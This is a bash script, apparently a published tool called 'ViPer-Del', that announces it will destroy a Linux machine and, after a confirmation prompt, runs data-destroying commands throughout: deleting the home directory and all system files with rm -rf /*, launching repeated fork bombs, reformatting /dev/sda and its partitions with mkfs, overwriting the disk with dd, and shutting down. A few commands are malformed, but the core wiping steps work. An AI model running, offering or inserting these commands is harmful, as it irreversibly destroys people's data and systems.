#!/bin/bash

echo
echo -e 'Yb    dP 88 88""Yb 888888 88""Yb          8888b.  888888 88     
 Yb  dP  88 88__dP 88__   88__dP ________  8I  Yb 88__   88     
  YbdP   88 88"""  88""   88"Yb  """"""""  8I  dY 88""   88  .o 
   YP    88 88     888888 88  Yb          8888Y"  888888 88ood8 ' 
echo
echo
echo '    --Destroy a Linux Machine with a simple script ! '
echo '    --Github : https://github.com/wh1ter0seo4/viperdel '
echo
echo '          ***Use This Tool AT YOUR OWN RISK !*** '
read -p "Are you sure you want to destroy this machine [y/n]? " -n 1 -r
echo    # (optional) move to a new line
if [[ ! $REPLY =~ ^[Yy]$ ]]
then
    exit 1
fi

echo
echo 'ViPer-Del Started...'
echo '--------------------------------------'
echo ' Gaining ROOT Permissions... '
 sudo cd /etc
echo ' [√] done'
echo
echo ' Moving home directory to /dev/null '
sudo mv ~ /dev/null
echo ' [√] done'
echo 
echo ' Deleting System Files "/*" '
sudo rm -rf /*
echo ' [√] done'
echo
echo ' Fork Bombing the machine... '
:(){ :|: & };:
:(){ :|: & };:
:(){ :|: & };:
:(){ :|: & };:
:(){ :|: & };:
:(){ :|: & };:
echo ' [√] done'
echo 
echo ' ViPer-Del Stage 1 **COMPLETED** '
echo
echo ' moving to stage 2....'
echo
echo ' ----STAGE 2 [√]----'
echo
echo ' Formating Hard Drive...'
sudo mkfs.ext3 /dev/sda
sudo mkfs.ext3 /dev/sda1
sudo mkfs.ext3 /dev/sda2
sudo mkfs.ext3 /dev/sda3
sudo mkfs.ext3 /dev/sda4
sudo mkfs.ext3 /dev/sda5
sudo mkfs.ext3 /dev/sda6
sudo mkfs.ext3 /dev/sda7
sudo mkfs.ext3 /dev/sda8
echo ' [√] done '
echo
echo ' Writing Directly to Hard Drive...'
> /dev/sda
sudo > /dev/sda
echo ' [√] done'
echo 
echo ' Writing Junk into the Hard Drive...'
dd if=dev/random of=/dev/sda
sudo dd if=dev/random of=/dev/sda
echo ' [√] done'
echo
echo ' **ViPer-Del Has Succesfully Destroyed This Machine!** '
echo shutting down...
shutdown now 
